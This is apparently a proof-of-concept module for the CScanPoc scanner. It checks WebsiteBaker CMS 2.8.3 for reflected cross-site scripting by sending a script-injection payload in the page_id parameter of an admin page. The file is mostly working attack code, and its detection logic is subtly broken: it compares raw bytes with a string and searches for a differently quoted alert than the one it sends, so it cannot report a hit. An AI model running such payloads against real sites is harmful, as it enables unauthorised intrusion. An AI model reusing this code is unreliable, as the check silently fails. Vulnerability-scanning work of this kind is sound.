# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WebsiteBaker-CMS_0101'  # 平台漏洞编号，留空
    name = 'Websitebaker-CMS v2.8.3 Reflecting XSS vulnerability'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-02-04'  # 漏洞公布时间
    desc = '''
        WebsiteBaker可帮助您创建所需的网站：免费，简单，安全，灵活且可扩展的开源内容管理系统（CMS）。
        隐藏表单中引发的反射XSS漏洞。
    '''  # 漏洞描述
    ref = 'http://packetstormsecurity.com/files/130008/CMS-Websitebaker-2.8.3-SP3-Cross-Site-Scripting.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WebsiteBaker-CMS'  # 漏洞应用名称
    product_version = 'v2.8.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '377a153f-c57a-458c-bd64-1bd1db26a76e'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/admin/pages/modify.php?page_id=1%22><script>alert(%27XSS%27)</script><!--'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<script>alert("XSS")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
